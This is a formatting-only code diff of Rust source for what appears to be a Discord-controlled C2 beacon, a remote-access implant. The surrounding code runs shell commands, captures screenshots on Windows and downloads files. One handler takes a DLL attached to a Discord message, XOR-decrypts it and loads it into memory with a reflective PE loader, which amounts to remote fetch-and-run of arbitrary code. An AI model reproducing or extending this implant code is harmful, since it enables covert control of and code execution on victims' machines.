@@ -13,7 +13,9 @@ use reqwest::StatusCode;
 
 #[cfg(windows)]
 use crate::commands::capture_screenshot;
-use crate::commands::{execute_shell_command, get_help_message, load_dll_from_bytes, Command, CommandResult};
+use crate::commands::{
+    execute_shell_command, get_help_message, load_dll_from_bytes, Command, CommandResult,
+};
 use crate::config::Config;
 use crate::error::{BeaconError, Result};
 
@@ -42,9 +44,7 @@ pub struct DiscordClient {
 impl DiscordClient {
     /// Create a new Discord client from configuration
     pub fn from_config(config: &Config) -> Result<Self> {
-        let client = Client::builder()
-            .timeout(Duration::from_secs(30))
-            .build()?;
+        let client = Client::builder().timeout(Duration::from_secs(30)).build()?;
 
         Ok(Self {
             client,
@@ -257,10 +257,7 @@ impl DiscordClient {
 
     /// Download a file from a URL
     pub fn download_file(&self, url: &str) -> Result<Vec<u8>> {
-        let response = self.client
-            .get(url)
-            .send()
-            .map_err(BeaconError::from)?;
+        let response = self.client.get(url).send().map_err(BeaconError::from)?;
 
         if !response.status().is_success() {
             return Err(BeaconError::Download(format!(
@@ -270,7 +267,8 @@ impl DiscordClient {
             )));
         }
 
-        response.bytes()
+        response
+            .bytes()
             .map(|b| b.to_vec())
             .map_err(BeaconError::from)
     }
@@ -421,21 +419,21 @@ impl DiscordClient {
     /// Downloads the DLL from attachment, decrypts it (XOR), and loads it using PE loader
     fn handle_loaddll(&self, attachments: &[Attachment], dll_name: &str) -> CommandResult {
         // Find the attachment with matching filename, or take the first .dll attachment
-        let attachment = attachments.iter()
-            .find(|a| {
-                if !dll_name.is_empty() {
-                    a.filename.eq_ignore_ascii_case(dll_name)
-                } else {
-                    a.filename.to_lowercase().ends_with(".dll") ||
-                    a.filename.to_lowercase().ends_with(".dll.enc")
-                }
-            });
+        let attachment = attachments.iter().find(|a| {
+            if !dll_name.is_empty() {
+                a.filename.eq_ignore_ascii_case(dll_name)
+            } else {
+                a.filename.to_lowercase().ends_with(".dll")
+                    || a.filename.to_lowercase().ends_with(".dll.enc")
+            }
+        });
 
         let attachment = match attachment {
             Some(a) => a,
             None => {
                 return CommandResult::Error(
-                    "No DLL attachment found. Attach a .dll or .dll.enc file to your message.".to_string()
+                    "No DLL attachment found. Attach a .dll or .dll.enc file to your message."
+                        .to_string(),
                 );
             }
         };
@@ -451,7 +449,7 @@ impl DiscordClient {
 
         // Load the DLL using PE loader
         let result = load_dll_from_bytes(&dll_bytes);
-        
+
         match result {
             Ok(base_addr) => CommandResult::TextResponse(format!(
                 "DLL '{}' loaded successfully at 0x{:X}",
@@ -467,7 +465,7 @@ fn xor_decrypt(data: &[u8], key: &[u8]) -> Vec<u8> {
     if key.is_empty() {
         return data.to_vec();
     }
-    
+
     data.iter()
         .enumerate()
         .map(|(i, &b)| b ^ key[i % key.len()])
